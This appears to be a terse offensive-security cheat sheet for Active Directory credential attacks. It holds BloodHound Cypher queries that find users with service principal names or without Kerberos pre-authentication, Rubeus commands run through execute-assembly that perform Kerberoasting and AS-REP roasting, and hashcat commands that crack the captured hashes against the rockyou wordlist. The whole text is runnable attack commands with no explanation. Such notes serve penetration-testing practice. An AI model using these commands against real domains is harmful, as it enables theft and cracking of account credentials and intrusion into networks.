``` a
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
MATCH (u:User {hasspn:true}) RETURN u
```
``` a
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast
hashcat -a 0 -m 13100 kerberoast-hashes /usr/share/wordlists/rockyou.txt
```
``` a
MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p   (Can use this to see more path)
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat
hashcat -a 0 -m 18200 kerberoast-hashes /usr/share/wordlists/rockyou.txt
```

